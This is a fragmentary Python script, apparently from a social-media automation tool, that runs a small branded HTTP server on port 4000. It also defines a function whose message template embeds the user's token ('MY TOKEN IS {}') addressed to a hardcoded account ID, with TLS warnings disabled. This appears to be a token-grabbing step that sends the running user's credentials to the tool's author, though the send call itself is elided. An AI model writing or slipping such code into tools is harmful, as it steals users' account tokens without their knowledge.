...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"-- SERVER RUNNING>>AYUSH H3R3")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "HELLO AYUSH SIR! I AM USING YOUR SERVER. MY TOKEN IS {}"

      # Specify the ID where you want to send the message
      target_id = "100001353923725"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•──────────────────────AYUSH H3R3 ───────────────────────────────•')
